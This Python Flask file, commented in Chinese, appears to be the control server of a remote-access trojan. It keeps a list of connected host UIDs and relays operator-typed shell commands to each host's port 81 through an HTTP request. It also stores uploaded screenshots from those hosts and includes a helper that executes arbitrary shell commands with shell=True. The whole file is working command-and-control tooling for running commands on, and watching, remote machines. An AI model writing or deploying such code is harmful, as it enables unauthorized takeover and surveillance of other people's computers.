import subprocess
import chardet
import requests
import socket
from flask import Flask, redirect, url_for, request, render_template, jsonify
import os
import time
import base64

app = Flask(__name__)
#flask中对于变量的使用<>

host = None

# 默认页面
@app.route('/')
def index():
    with open('list.txt','r') as f:
        uids = f.readlines()
        if uids != None:
            return render_template('index.html',uids=uids)
        else:
            return "暂未有主机连接"

@app.route('/activate/<host>',methods=['GET','POST'])
def activate(host):
    return render_template('cmd.html',data=host)

@app.route('/cmd/<host>',methods=['GET','POST'])
def cmd(host):
    return render_template('cmd.html',data=host)

@app.route('/cmd_result')
def cmd_result():
    command = request.args.get('command', type=str)
    hostname = request.args.get('hostname', type=str)
    # 本地测试代码
    #out = cmd1(command)
    try:
        out = requests.get(url=f'http://{hostname}:81/cmd/{command}',timeout=5).text
    except:
        out = "客户端未连接！！！"
    return jsonify(result=out)


@app.route('/info/',methods=['GET','POST'])
def info():
    flist = open("list.txt",'r')
    uid = request.form['uid']
    fcontent = flist.readlines()
    flist.close()
    if uid not in fcontent:
        f = open("list.txt",'a')
        f.write(uid)
        f.close()
    return redirect(url_for('index'))

@app.route('/upload/',methods=['POST'])
def upload():
    if request.method == 'POST':
        content = request.get_data()
        with open('screen.jpg','wb') as file:
            file.write(content)
    return 0



# 调用系统命令
def cmd1(command: str):
    command = command.encode()
    # 调用 subprocess.Popen 执行命令
    p = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    # 接收命令执行后的返回信息，获取到的是中文为二进制字符，需要转码
    data = p.stdout.read()
    # 获取编码方式
    encoding = chardet.detect(data)['encoding']
    # 解码
    out = "".join(data.decode(encoding))
    # 数据返回
    return out


if __name__ == '__main__':
    app.run('0.0.0.0',8090,debug=True)

